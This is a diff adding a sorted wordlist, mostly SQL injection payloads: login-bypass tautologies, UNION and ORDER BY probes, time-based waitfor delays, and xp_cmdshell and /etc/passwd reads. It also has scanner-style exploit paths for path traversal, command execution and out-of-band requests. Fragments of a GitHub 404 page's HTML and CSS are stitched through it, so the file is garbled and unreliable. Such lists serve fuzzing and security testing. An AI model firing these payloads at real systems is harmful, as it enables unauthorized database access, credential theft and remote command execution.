@@ -1,0 +1,1213 @@
+"
+" "
+" #
+" --
+" OR "" = "
+" OR 1 = 1 -- -
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""="
+" or ""^"
+" or "1"="1
+" or "1"="1"#
+" or "1"="1"--
+" or "1"="1"/*
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 0=0 –
+" or 1=1
+" or 1=1 --
+" or 1=1 or ""="
+" or 1=1 –
+" or 1=1#
+" or 1=1--
+" or 1=1/*
+" or 1=1–
+" or true--
+" waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /*
+" waitfor delay '0:0:__TIME__' --
+" waitfor delay '0:0:__TIME__' /*
+""
+"&"
+"' or 1 --'"
+")
+") or "1"="1
+") or "1"="1"#
+") or "1"="1"--
+") or "1"="1"/*
+") or true--
+") waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /*
+") waitfor delay '0:0:__TIME__' --
+") waitfor delay '0:0:__TIME__' /*
+"))
+")) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /*
+")) waitfor delay '0:0:__TIME__' --
+")) waitfor delay '0:0:__TIME__' /*
+")))
+"))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /*
+"))) waitfor delay '0:0:__TIME__' --
+"))) waitfor delay '0:0:__TIME__' /*
+")))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /*
+")))) waitfor delay '0:0:__TIME__' --
+")))) waitfor delay '0:0:__TIME__' /*
+"))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /*
+"))))) waitfor delay '0:0:__TIME__' --
+"))))) waitfor delay '0:0:__TIME__' /*
+")))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /*
+")))))) waitfor delay '0:0:__TIME__' --
+")))))) waitfor delay '0:0:__TIME__' /*
+"));waitfor delay '0:0:__TIME__'--
+");
+");waitfor delay '0:0:__TIME__'--
+"*"
+"-"
+"/*
+";
+";waitfor delay '0:0:__TIME__'--
+"^"
+"a"" or 1=1--"
+"a"" or 3=3--"
+"or 1=1 or ""="
+&
+&.o&1: select * from users where id=1 or \.<\ or 1=1 -- 1
+&.o1&: select * from users where id=1 or \.<1 or 1=1 -- 1
+&.on&: select * from users where id=1 or \.<$ or 1=1 -- 1
+&1c: select * from users where id=1   or 1=1 -- 1
+&1oo&: select * from users where id=1 or \+<\ or 1=1 -- 1
+&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1
+&no&1: select * from users where id=1 or $<\ or 1=1 -- 1
+&no.&: select * from users where id=1 or $<\. or 1=1 -- 1
+&noo&: select * from users where id=1 or $+<\ or 1=1 -- 1
+&o.&1: select * from users where id=1 or \<\. or 1=1 -- 1
+&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1
+&on&1: select * from users where id=1 or \<$ or 1=1 -- 1
+&oo1&: select * from users where id=1 or \< =1 or 1=1 -- 1
+'
+' #
+' '
+' --
+' -- &password=
+' ; drop table temp --
+' AND id IS NULL; --
+' GROUP BY columnnames having 1=1 --
+' OR '' = '
+' OR '1
+' OR 'x'='x
+' OR 'x'='x'#;
+' OR 1 -- -
+' UNION ALL SELECT
+' UNION SELECT
+' and '2'='0
+' and '2'='0'#mysql
+' and '2'='0'-- oracle
+' and '2'='2
+' and '2'='2'#mysql
+' and '2'='2'-- oracle
+' and 'one'='one
+' and 'one'='one–
+' and 1='1
+' and 1=0) union all
+' and a='a
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' having 1=1--
+' or         0=0 #
+' or "
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+' or '1'='1
+' or '1'='1'#
+' or '1'='1'--
+' or '1'='1'/*
+' or '1′='1
+' or '2'='2
+' or 'a'='a
+' or 'one'='one
+' or 'one'='one–
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'text' > 't'
+' or 'unusual' = 'unusual'
+' or 'x'='x
+' or 0=0 #
+' or 0=0 --
+' or 0=0 –
+' or 1 --'
+' or 1/*
+' or 1=1
+' or 1=1 --
+' or 1=1 /*
+' or 1=1 LIMIT 1;#
+' or 1=1 or ''='
+' or 1=1 –
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' or 1=1;#
+' or 1=1–
+' or 2 > 1
+' or 2 between 1 and 3
+' or 3=3
+' or a=a--
+' or a=a–
+' or true--
+' or username is not NULL or username = '
+' select * from information_schema.tables--
+' union all select @@version--
+' union select
+' waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /*
+' waitfor delay '0:0:__TIME__' --
+' waitfor delay '0:0:__TIME__' /*
+' –
+'"
+'#
+'#mysql
+'&'
+''
+'''''''''''''UNION SELECT '2
+')
+') or '1'='1
+') or '1'='1'#
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1--
+') or true--
+') waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /*
+') waitfor delay '0:0:__TIME__' --
+') waitfor delay '0:0:__TIME__' /*
+'))
+')) waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /*
+')) waitfor delay '0:0:__TIME__' --
+')) waitfor delay '0:0:__TIME__' /*
+'))) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /*
+'))) waitfor delay '0:0:__TIME__' --
+'))) waitfor delay '0:0:__TIME__' /*
+')))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /*
+')))) waitfor delay '0:0:__TIME__' --
+')))) waitfor delay '0:0:__TIME__' /*
+'))))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /*
+'))))) waitfor delay '0:0:__TIME__' --
+'))))) waitfor delay '0:0:__TIME__' /*
+')))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /*
+')))))) waitfor delay '0:0:__TIME__' --
+')))))) waitfor delay '0:0:__TIME__' /*
+'));waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+'*'
+'+sqlvuln
+'-'
+'--
+'/*
+'/*ora_mysql*/and/**/'2'='0
+'/*ora_mysql*/and/**/'2'='2
+'/*ora_mysql*/or/**/'2'='2
+';
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec master..xp_cmdshell 'ping aaa.bbb.ccc.ddd'--
+'; exec xp_regread
+'; execute immediate 'sel' || 'ect us' || 'er'
+';WAITFOR DELAY '0:0:30'--
+';waitfor delay '0:0:__TIME__'--
+'='
+'=' 'or' and '=' 'or'
+'=0--+
+'LIKE'
+'\"
+'^'
+'hi' or 'x'='x';
+'or 1=1 or ''='
+'or'1=1
+'or'1=1′
+'sqlattempt1
+'sqlvuln
+'test
+'test--
+'||'6
+'||UTL_HTTP.REQUEST
+)
+) or '1′='1–
+) union select * from information_schema.tables;
+) waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /*
+) waitfor delay '0:0:__TIME__' --
+) waitfor delay '0:0:__TIME__' /*
+)) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /*
+)) waitfor delay '0:0:__TIME__' --
+)) waitfor delay '0:0:__TIME__' /*
+))) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /*
+))) waitfor delay '0:0:__TIME__' --
+))) waitfor delay '0:0:__TIME__' /*
+)))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /*
+)))) waitfor delay '0:0:__TIME__' --
+)))) waitfor delay '0:0:__TIME__' /*
+))))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:__TIME__' --
+)))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:__TIME__' --
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+*/*
+*|
+-
+--
+-- -	SQL comment
+-- or #
+--';
+--ora_sqls
+--sp_password
+--tab-size-preference: 4;
+-2
+.&1c: select * from users where id=1. or 1=1 -- 1
+.o&1c: select * from users where id=1. <@ or 1=1 -- 1
+.o.&1: select * from users where id=1.<@. or 1=1 -- 1
+.o1&1: select * from users where id=1.*1 or 1=1 -- 1
+.on&1: select * from users where id=1.<@$ or 1=1 -- 1
+/
+/*  	C-style comment
+/* Override primer focus outline color for marketing header dropdown links for better contrast */
+/*ora_mysql*/and/**/2=0
+/*ora_mysql*/and/**/2=2
+/*…*/
+/+CSCOE+/session_password.html
+//
+//*
+/?q=node&destination=node
+/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y
+/Api/portal/elementEcodeAddon/getSqlData?sql=
+/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://oast.fun
+/SWNetPerfMon.db.i18n.ashx?l={{string}}&v={{string}}
+/Side.php
+/account/index.php
+/action.php
+/actions/authenticate.php
+/actions/seomatic/meta-container/all-meta-containers?uri={{228*
+/actions/seomatic/meta-container/meta-link-container/?uri={{228*
+/admin/
+/admin/requests/take_action.php?id=6
+/admin/suppliers/view_details.php?id=1
+/agc/vicidial_mysqli_errors.txt
+/albatross/saml/idpSelection?id={{randstr}}&userName=admin
+/api/config
+/api/dp/rptsvcsyncpoint?ccid=1
+/api/experimental/latest_runs
+/api/v1/confup?mode=&uid=1
+/api/v1/confup?mode=lean&uid=1
+/api/v1/ndconfig?mode=&uid=1
+/api/v1/ndconfig?mode=lean&uid=1
+/arcade.php?act=Arcade&do=stats&comment=a&s_id=1
+/auth/check
+/auth/newpassword
+/cgi-bin/live_api.cgi?page={{str}}&id={{num}}&ip=;id;
+/cgi-bin/weblogin.cgi?username=admin
+/common/dept.jsp?deptid=1
+/compliancepolicyelements.inc.php?search=True&searchField=antani
+/console/login/LoginForm.jsp
+/context.json
+/data/pbootcms.db
+/devices.inc.php?search=True&searchField=antani
+/displays/nuclei_check.json
+/graphql
+/homeaction.php
+/index.php
+/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test
+/index.php?m=member&f=login_save
+/index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1
+/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails
+/index/download/index?name=index.php&url=../../application/database.php
+/indexer/settings
+/installer/index.php
+/login
+/manage/fileDownloader?sec=1
+/member/ajax_membergroup.php?action=post&membergroup=@`
+/mobile/plugin/CheckServer.jsp?type=mobileSetting
+/modules/blockwishlist/config.xml
+/mysql_config.ini
+/nagiosql/admin/menuaccess.php
+/nette.micro/?callback=phpcredits
+/opensis/index.php
+/portal/attachment_clearTempFile.action?bean.RecId=1
+/portal/attachment_getAttList.action?bean.RecId=1
+/roundcube/installer/index.php
+/run
+/scrm/crm/admin
+/server/
+/settings
+/snippets.inc.php?search=True&searchField=antani
+/sqlite/
+/sqlitemanager/
+/ucmdb-api/connect
+/user/City_ajax.aspx?CityId=33
+/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+/web.config.i18n.ashx?l={{string}}&v={{string}}
+/webadmin/out
+/wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
+/wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo
+/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL
+/wp-content/plugins/better-search-replace/README.txt
+/wp-content/plugins/better-search-replace/readme.txt
+/wp-content/plugins/easy-digital-downloads/readme.txt
+/wp-content/plugins/email-subscribers/readme.txt
+/wp-content/plugins/essential-blocks/readme.txt
+/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
+/wp-content/plugins/form-maker/readme.txt
+/wp-content/plugins/mstore-api/readme.txt
+/wp-content/plugins/seo-by-rank-math/readme.txt
+/wp-content/plugins/the-plus-addons-for-elementor-page-builder/readme.txt
+/wp-content/plugins/wp-fastest-cache/readme.txt
+/wp-json/h5vp/v1/video/0?id=
+/wp-json/visualizer/v1/upload-data
+/wp1/home-18/?qtproxycall=https://oast.me
+/{{path}}
+0
+0 or 1=1
+1
+1 and 1=1
+1 or 1=1
+1 uni/**/on select all from where
+1 waitfor delay '0:0:10'--
+1 waitfor delay '0:0:X'--
+1&1c: select * from users where id=1 +1 or 1=1 -- 1
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' and non_existant_table = '1
+1' or '1'='1
+1')); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1'1
+1'; waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1*56
+1-false
+1-true
+1; waitfor delay '0:0:X'--
+1\'1
+1′) and '1′='1–
+2 or 2=2
+2 order by 1
+2' or '2'='2
+23 OR 1=1
+23 or 1=1; --
+404: Not Found
+:root {
+;
+; or '1'='1'
+;waitfor delay '0:0:__TIME__'--
+</a>
+</a></li>
+</auto-check>
+</body>
+</button>
+</clipboard-copy>
+</cookie-consent-link>
+</custom-scopes>
+</details-dialog>
+</details>
+</dialog></dialog-helper>
+</div>
+</div>    </div>
+</div></div>            </div>
+</experimental-action-menu>  </locale-selector>
+</footer>
+</form>
+</form>        </div>
+</form>  <webauthn-status class="js-webauthn-login-emu-control">
+</form></div>
+</h1>
+</h3>
+</h4>
+</head>
+</header>
+</html>
+</label>
+</li>
+</main>
+</modal-dialog></div>
+</nav>
+</p>
+</qbsearch-input>
+</query-builder></form>
+</react-partial-anchor>
+</react-partial>
+</scrollable-region>
+</section>
+</span>
+</span></span>
+</style>
+</svg>
+</svg></button>
+</template>
+</ul>
+</webauthn-status>
+<a
+<a class="tmp-mr-lg-3 color-fg-inherit flex-order-2 js-prevent-focus-on-mobile-nav"
+<a href="https://githubstatus.com" class="Link--secondary">GitHub Status</a> &mdash;
+<a href="https://twitter.com/githubstatus" class="Link--secondary">@githubstatus</a>
+<auto-check src="/search/custom_scopes/check_name" required>
+<button
+<button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
+<cookie-consent-link>
+<custom-scopes data-target="qbsearch-input.customScopesManager">
+<dialog-helper>
+<div
+<div >
+<div aria-atomic="true" role="alert" class="js-flash-alert">
+<div aria-hidden="true" class="QueryBuilder-Sizer" data-target="query-builder.sizer"></div>
+<div class="AppHeader-appearanceSettings">
+<div class="FormControl FormControl--fullWidth">
+<div class="HeaderMenu-toggle-bar rounded my-1"></div>
+<div class="HeaderMenu-toggle-bar rounded my-1"></div></span>
+<div class="Overlay Overlay-whenNarrow Overlay--height-auto Overlay--width-auto" hidden>
+<div class="Overlay--hidden " data-modal-dialog-overlay>
+<div class="Overlay-actionWrap">
+<div class="Overlay-backdrop--anchor" data-menu-overlay>
+<div class="Overlay-body Overlay-body--paddingNone">
+<div class="Overlay-headerContentWrap">
+<div class="Overlay-titleWrap">
+<div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
+<div class="QueryBuilder-InputWrapper">
+<div class="color-bg-subtle">
+<div class="color-fg-default">
+<div class="container-lg tmp-mt-5 tmp-px-3">
+<div class="container-xl p-responsive">
+<div class="d-flex flex-1 flex-order-2 text-right d-lg-none gap-2 flex-justify-end">
+<div class="d-flex flex-items-center">
+<div class="d-flex flex-justify-between flex-items-center width-full width-lg-auto">
+<div class="d-flex flex-wrap tmp-py-5 tmp-mb-5">
+<div class="d-flex" data-target="qbsearch-input.hotkeyIndicator">
+<div class="flash flash-full   {{ className }}">
+<div class="flex-1">
+<div class="form-group">
+<div class="mr-2 color-fg-muted">
+<div class="octocat-spinner tmp-my-6 js-details-dialog-spinner"></div>
+<div class="position-relative HeaderMenu-link-wrap d-lg-inline-block">
+<div class="position-relative header-wrapper js-header-wrapper ">
+<div class="position-relative" style="z-index: 0; transition: all 0.25s ease-in">
+<div class="position-relative">
+<div class="tmp-mt-5 color-fg-muted text-center">
+<div class="zeroclipboard-container position-absolute right-0 top-0">
+<div class="zeroclipboard-container">
+<div data-target="custom-scopes.customScopesModalDialogFlash"></div>
+<div data-target="custom-scopes.list"></div>
+<div data-target="custom-scopes.manageCustomScopesForm">
+<div data-target="query-builder.styledInputContainer" class="QueryBuilder-StyledInputContainer">
+<div data-target="react-partial.reactRoot"></div>
+<div hidden class="create-custom-scope-form" data-target="custom-scopes.createCustomScopeForm">
+<div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
+<div id="js-flash-container" class="flash-container" data-turbo-replace>
+<div id="start-of-content" class="show-on-focus"></div>
+<div>{{ message }}</div>
+<h1 class="Overlay-title " id="custom-scopes-dialog-title">
+<h1 class="Overlay-title " id="feedback-dialog-title">
+<h2 class="sr-only">Navigation Menu</h2>
+<h2 class="sr-only">Site-wide Links</h2>
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-company">
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-platform">
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-product">
+<h3 class="h5 tmp-mb-3 text-mono color-fg-muted text-normal" id="footer-title-support">
+<h3 class="h5 tmp-mt-4 mb-0" id="subscribe-to-newsletter">Subscribe to our developer newsletter</h3>
+<head>
+<html
+<input
+<input type="hidden" class="js-support" name="javascript-support" value="unknown">
+<input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
+<input type="hidden" name="client_id" id="client_id" autocomplete="off" class="form-control" />
+<input type="hidden" name="integration" id="integration" autocomplete="off" class="form-control" />
+<input type="hidden" name="type" class="js-site-search-type-field">
+<input type="hidden" name="webauthn-conditional" value="undefined">
+<input type="text" name="q" id="not-found-search" class="flex-auto input-lg form-control mr-2">
+<label for="custom_scope_name">Name</label>
+<label for="custom_scope_query">Query</label>
+<label for="login_field">
+<label for="password">
+<label id="query-builder-test-label" for="query-builder-test" class="FormControl-label sr-only">
+<li >
+<li class="lh-condensed tmp-mb-3">
+<li>
+<link rel="assets" href="https://github.githubassets.com/">
+<link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
+<link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
+<link rel="dns-prefetch" href="https://github.githubassets.com">
+<link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+<link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
+<link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">
+<link rel="preconnect" href="https://avatars.githubusercontent.com">
+<link rel="preconnect" href="https://github.githubassets.com" crossorigin>
+<locale-selector>
+<main class="font-mktg " >
+<meta charset="utf-8">
+<meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">
+<meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">
+<meta name="color-scheme" content="light dark" />
+<meta name="disable-turbo" content="false">
+<meta name="expected-hostname" content="github.com">
+<meta name="github-keyboard-shortcuts" content="copilot" data-turbo-transient="true" />
+<meta name="hostname" content="github.com">
+<meta name="is_logged_out_page" content="true">
+<meta name="octolytics-page-type" content="marketing" />
+<meta name="octolytics-url" content="https://collector.github.com/github/collect" />
+<meta name="route-action" content="raw" data-turbo-transient>
+<meta name="route-controller" content="blob" data-turbo-transient>
+<meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">
+<meta name="ui-target" content="full">
+<meta name="user-login" content="">
+<meta name="viewport" content="width=device-width">
+<meta property="og:image:height" content="620">
+<meta property="og:image:type" content="image/png">
+<meta property="og:site_name" content="GitHub">
+<meta property="og:url" content="https://github.com">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:creator" content="github">
+<meta property="twitter:site" content="github">
+<meta property="twitter:title" content="GitHub">
+<nav aria-label="Legal and Resource Links">
+<p class="text-small color-fg-muted">
+<path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
+<react-partial
+<react-partial-anchor>
+<script type="application/json" data-target="react-partial.embeddedData">{"props":{}}</script>
+<scrollable-region data-labelled-by="custom-scopes-dialog-title">
+<scrollable-region data-labelled-by="feedback-dialog-title">
+<section class="col-12 col-lg-4 tmp-mb-5 tmp-pr-lg-4">
+<span class="ActionList-item-label">
+<span class="Button-label"><div class="HeaderMenu-toggle-bar rounded my-1"></div>
+<span class="Button-label"><span class="locale-selector-trigger">
+<span class="Button-label">or continue with other methods</span>
+<span class="FormControl-inlineValidation--visual">
+<span class="color-fg-muted Link--secondary f6">English</span>
+<span class="d-none">Toggle navigation</span>
+<span class="flex-1" data-target="qbsearch-input.inputButtonText">Search or jump to...</span>
+<span class="sr-only" id="query-builder-test-clear">Clear</span>
+<span class="sr-only">GitHub on Instagram</span>
+<span class="sr-only">GitHub on LinkedIn</span>
+<span class="sr-only">GitHub on TikTok</span>
+<span class="sr-only">GitHub on Twitch</span>
+<span class="sr-only">GitHub on X</span>
+<span class="sr-only">GitHub on YouTube</span>
+<span class="sr-only">GitHub’s organization on GitHub</span>
+<span data-target="query-builder.clearButton" hidden>
+<span></span>
+<span>English</span>
+<span>日本語</span>
+<span>한국어</span>
+<style type="text/css">
+<style>
+<summary role="button" aria-label="Close dialog"></summary>
+<template class="js-flash-template">
+<template data-target="react-partial-anchor.template">
+<template id="book-icon">
+<template id="bookmark-icon">
+<template id="circle-icon">
+<template id="code-icon">
+<template id="code-review-icon">
+<template id="code-square-icon">
+<template id="codespaces-icon">
+<template id="comment-discussion-icon">
+<template id="comment-icon">
+<template id="copilot-error-icon">
+<template id="copilot-icon">
+<template id="credit-card-icon">
+<template id="device-desktop-icon">
+<template id="device-mobile-icon">
+<template id="file-code-icon">
+<template id="gift-icon">
+<template id="globe-icon">
+<template id="heart-icon">
+<template id="history-icon">
+<template id="issue-opened-icon">
+<template id="organization-icon">
+<template id="package-icon">
+<template id="pencil-icon">
+<template id="play-icon">
+<template id="plus-circle-icon">
+<template id="project-icon">
+<template id="repo-icon">
+<template id="rocket-icon">
+<template id="search-icon">
+<template id="server-icon">
+<template id="shield-check-icon">
+<template id="site-details-dialog">
+<template id="snippet-clipboard-copy-button">
+<template id="snippet-clipboard-copy-button-unpositioned">
+<template id="team-icon">
+<template id="trash-icon">
+<template id="workflow-icon">
+<title>Page not found · GitHub · GitHub</title>
+<ul
+<ul class="ActionList" id="locale-selector-list" role="menu" aria-labelledby="locale-selector-text">
+<ul class="list-style-none color-fg-muted f5">
+<ul class="list-style-none d-flex flex-items-center lh-condensed-ultra gap-3">
+<ul class="list-style-none d-flex flex-wrap color-fg-muted gapx-3">
+<ul class="list-style-none f5">
+=
+==
+>
+></div>
+></ghcc-consent>
+></ul>
+?
+? or 1=1 --
+@
+@@variable	global variable
+@var select @var as var into temp end --
+@variable
+@variable	local variable
+AND 0
+AND 1
+AND 1=0
+AND 1=0#
+AND 1=0--
+AND 1=1
+AND 1=1#
+AND 1=1--
+AND false
+AND true
+AS INJECTX WHERE 1=1 AND 1=0
+AS INJECTX WHERE 1=1 AND 1=0#
+AS INJECTX WHERE 1=1 AND 1=0--
+AS INJECTX WHERE 1=1 AND 1=1
+AS INJECTX WHERE 1=1 AND 1=1#
+AS INJECTX WHERE 1=1 AND 1=1--
+Comments:
+Company
+Do not share my personal information
+Ecosystem
+Finding the table name
+HAVING 1=0
+HAVING 1=0#
+HAVING 1=0--
+HAVING 1=1
+HAVING 1=1#
+HAVING 1=1--
+Manage cookies
+OR 1=0
+OR 1=0#
+OR 1=0--
+OR 1=1
+OR 1=1#
+OR 1=1--
+OR x=x
+OR x=x#
+OR x=x--
+OR x=y
+OR x=y#
+OR x=y--
+ORDER BY 1
+ORDER BY 1#
+ORDER BY 1--
+ORDER BY 10
+ORDER BY 10#
+ORDER BY 10--
+ORDER BY 11
+ORDER BY 11#
+ORDER BY 11--
+ORDER BY 12
+ORDER BY 12#
+ORDER BY 12--
+ORDER BY 13
+ORDER BY 13#
+ORDER BY 13--
+ORDER BY 14
+ORDER BY 14#
+ORDER BY 14--
+ORDER BY 15
+ORDER BY 15#
+ORDER BY 15--
+ORDER BY 16
+ORDER BY 16#
+ORDER BY 16--
+ORDER BY 17
+ORDER BY 17#
+ORDER BY 17--
+ORDER BY 18
+ORDER BY 18#
+ORDER BY 18--
+ORDER BY 19
+ORDER BY 19#
+ORDER BY 19--
+ORDER BY 2
+ORDER BY 2#
+ORDER BY 2--
+ORDER BY 20
+ORDER BY 20#
+ORDER BY 20--
+ORDER BY 21
+ORDER BY 21#
+ORDER BY 21--
+ORDER BY 22
+ORDER BY 22#
+ORDER BY 22--
+ORDER BY 23
+ORDER BY 23#
+ORDER BY 23--
+ORDER BY 24
+ORDER BY 24#
+ORDER BY 24--
+ORDER BY 25
+ORDER BY 25#
+ORDER BY 25--
+ORDER BY 26
+ORDER BY 26#
+ORDER BY 26--
+ORDER BY 27
+ORDER BY 27#
+ORDER BY 27--
+ORDER BY 28
+ORDER BY 28#
+ORDER BY 28--
+ORDER BY 29
+ORDER BY 29#
+ORDER BY 29--
+ORDER BY 3
+ORDER BY 3#
+ORDER BY 3--
+ORDER BY 30
+ORDER BY 30#
+ORDER BY 30--
+ORDER BY 4
+ORDER BY 4#
+ORDER BY 4--
+ORDER BY 5
+ORDER BY 5#
+ORDER BY 5--
+ORDER BY 6
+ORDER BY 6#
+ORDER BY 6--
+ORDER BY 7
+ORDER BY 7#
+ORDER BY 7--
+ORDER BY 8
+ORDER BY 8#
+ORDER BY 8--
+ORDER BY 9
+ORDER BY 9#
+ORDER BY 9--
+PRINT
+PRINT @@variable
+Password
+Platform
+Provide feedback
+Saved searches
+Search
+Sign in
+Sign up
+Subscribe
+Support
+Time-Based:
+UNION ALL SELECT 'INJ'||'ECT'||'XXX'
+UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
+UNION ALL SELECT 'INJ'||'ECT'||'XXX'--
+UNION ALL SELECT 1
+UNION ALL SELECT 1#
+UNION ALL SELECT 1--
+UNION ALL SELECT NULL
+UNION ALL SELECT NULL#
+UNION ALL SELECT NULL--
+Username or email address
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=0#
+WHERE 1=1 AND 1=0--
+WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=1#
+WHERE 1=1 AND 1=1--
+You can’t perform that action at this time.
+[data-color-mode="light"] .HeaderMenu-trailing-link a:focus-visible {
+\
+\'; desc users; --
+\\
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+`
+`	    Backtick
+``
+a
+a" and "fghi"="fghj"-- #
+a" or "dfth"="dfth"-- #
+a" order by 1-- #
+a"and/*g*/456=678-- #
+a"or/*g*/345=345-- #
+a'
+a' --
+a' and 'fghi'='fghj'#
+a' and 'fghi'='fghj'--
+a' and 'fghi'='fghj'-- #
+a' or 'a' = 'a
+a' or 'dfth'='dfth'#
+a' or 'dfth'='dfth'--
+a' or 'dfth'='dfth'-- #
+a' or 1=1--
+a' or 1=1; --
+a' or 3=3--
+a' order by 1#
+a' order by 1--
+a' order by 1-- #
+a' waitfor delay '0:0:10'--
+a'and/*d*/456=678--
+a'and/*g*/456=678-- #
+a'or/*d*/345=345--
+a'or/*g*/345=345-- #
+a'||/**/345=345#
+a'||/**/456=678#
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin'
+admin' #
+admin' --
+admin' or '
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin'#
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin'--
+admin'/*
+admin'or 1=1 or ''='
+and 1=1
+and 1=1–
+and 2=0
+and 2=0#mysql
+and 2=0-- oracle_mysql
+and 2=2#mysql
+and 2=2-- oracle_mysql
+and USER=USER
+anything' OR 'x'='x
+anything' or 'x'='x
+aria-haspopup="dialog"
+aria-hidden="true"
+aria-label="Homepage"
+aria-label="Search or jump to…"
+aria-label="Suggestions"
+as
+asc
+autocapitalize="off"
+autocomplete="off"
+bfilename
+blur:query-builder#clearButtonBlur
+blur:query-builder#inputBlur
+class="ActionListWrap QueryBuilder-ListWrap"
+class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent text-left"
+class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
+class="QueryBuilder-StyledInput width-fit "
+class="QueryBuilder-StyledInputContent"
+class="application-main d-flex flex-auto flex-column"
+class="form-control"
+click:query-builder#clear
+combobox-commit:query-builder#comboboxCommit
+copy myfile from '/etc/passwd';
+create user name identified by 'pass123'
+create user name identified by pass123 temporary tablespace temp default tablespace users;
+data-a11y-animated-images="system" data-a11y-link-underlines="true"
+data-action="
+data-action="click:cookie-consent-link#showConsentManagement"
+data-action="click:qbsearch-input#handleExpand"
+data-action="click:qbsearch-input#searchInputContainerClicked"
+data-attempted-ssr="false"
+data-attempted-ssr="true"
+data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
+data-commit-hovercards-enabled
+data-cookie-consent-required="false"
+data-discussion-hovercards-enabled
+data-initial-cookie-consent-allowed=""
+data-issue-and-pr-hovercards-enabled
+data-locale="en"
+data-persist-list=false
+data-project-hovercards-enabled
+data-react-profiling="true"
+data-ssr="false"
+data-ssr="true"
+data-target="custom-scopes.customScopesNameField"
+data-target="custom-scopes.customScopesQueryField"
+data-target="qbsearch-input.inputButton"
+data-target="qbsearch-input.queryBuilderContainer"
+data-target="query-builder.resultsList"
